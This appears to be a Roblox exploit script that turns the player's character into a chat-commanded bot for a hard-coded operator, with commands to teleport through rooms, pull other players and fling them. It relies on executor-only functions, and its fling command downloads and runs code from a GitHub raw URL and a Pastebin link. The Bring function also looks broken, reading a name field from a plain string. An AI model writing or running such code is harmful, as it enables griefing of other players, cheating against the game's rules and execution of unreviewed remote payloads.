local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Ops = {[4089251764] = true}
local skipping = false

local function GetRoot()
	local character = LocalPlayer.Character
	local hrp = character:WaitForChild("HumanoidRootPart")
	
	return hrp
end

local function Trim(s)
	return s:match("^%s*(.-)%s*$")
end

local function GetPlayer(query)
	if not query or query == "" then return nil end
	query = query:lower()
	local matches = {}
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name:lower():find(query, 1, true) or player.DisplayName:lower():find(query, 1, true) then
			table.insert(matches, player)
		end
	end
	if #matches == 1 then
		return matches[1]
	end
	return nil
end

local function Op(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(5) or "")
	if targetRaw == "" then return end
	if targetRaw:lower() == "all" then
		for _, player in ipairs(Players:GetPlayers()) do
			Ops[player.UserId] = true
		end
		return
	end
	local targetPlayer = GetPlayer(targetRaw)
	if targetPlayer then
		Ops[targetPlayer.UserId] = true
	end
end

local function Deop(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(7) or "")
	if targetRaw == "" then return end
	if targetRaw:lower() == "all" then
		for _, player in ipairs(Players:GetPlayers()) do
			if player.UserId ~= 4089251764 then
				Ops[player.UserId] = nil
			end
		end
		return
	end
	local targetPlayer = GetPlayer(targetRaw)
	if targetPlayer and targetPlayer.UserId ~= 4089251764 then
		Ops[targetPlayer.UserId] = nil
	end
end

local function Skip(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local numberRaw = Trim(raw:sub(7) or "")
	
	local hrp = GetRoot()
	
	local count = tonumber(numberRaw)
	if not count then count = 1 end
	skipping = true
	for i = 1, count do
		if not skipping then break end
		
		local target = workspace:WaitForChild("LoadedRooms"):WaitForChild("RoomExit")
		hrp.CFrame = target.CFrame
		
		task.wait(1)
	end
end

local function Stop(speaker)
	if not Ops[speaker.UserId] then return end
	skipping = false
end

local function BringBot(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local arg = Trim(raw:sub(10) or "")
	
	local hrp = GetRoot()
	
	if arg == "" then
		local targetHrp = speaker.Character:FindFirstChild("HumanoidRootPart")
		if targetHrp then
			hrp.CFrame = targetHrp.CFrame
		end
		return
	end

	local targetPlayer = GetPlayer(arg)
	if not targetPlayer then return end
	local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHrp then
		hrp.CFrame = targetHrp.CFrame
	end
end

local function Bring(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(7) or "")
	
	if targetRaw == "" then return end

	local targetPlayer = GetPlayer(targetRaw)
	if targetPlayer then
		local CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local Target = targetRaw.Name
		for i,x in pairs(game.Players:GetPlayers()) do
			if x.Name == Target then
				game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
				local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid:Clone()
				Humanoid.BreakJointsOnDeath = false
				game.Players.LocalPlayer.Character.Animate.Disabled = true
				game:GetService("Players").LocalPlayer.Character.Humanoid:Destroy()
				Humanoid.Parent = game:GetService("Players").LocalPlayer.Character
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v:IsA("Tool") then
						game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool"))
						firetouchinterest(v.Handle,x.Character.HumanoidRootPart,0)
					end
				end
			end
		end
		game.Players.LocalPlayer.CharacterAdded:Wait():WaitForChild("Humanoid")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame
	end
end

local function Fling(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(5) or "")
	if targetRaw ~= "" then 
		local targetPlayer = GetPlayer(targetRaw)
		if targetPlayer then
			getgenv().Target = targetPlayer.Name
			loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
		end
	else
		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
	end
end


local function PlayerChatted(speaker, message)
	if message == ":stop" then
		Stop(speaker)
		return
	end
	if message:sub(1,5) == ":skip" then
		Skip(speaker, message)
		return
	end
	if message:sub(1,4) == ":op " or message == ":op" then
		Op(speaker, message)
		return
	end
	if message:sub(1,6) == ":deop " or message == ":deop" then
		Deop(speaker, message)
		return
	end
	if message:sub(1,7) == ":bring " or message == ":bring" then
		Bring(speaker, message)
		return
	end
	if message:sub(1,10) == ":bringbot " or message == ":bringbot" then
		BringBot(speaker, message)
		return
	end
	if message:sub(1,7) == ":fling " or message == ":fling" then
		Fling(speaker, message)
		return
	end
end

local function Loader(player)
	player.Chatted:Connect(function(msg)
		PlayerChatted(player, msg)
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	Loader(player)
end

Players.PlayerAdded:Connect(Loader)
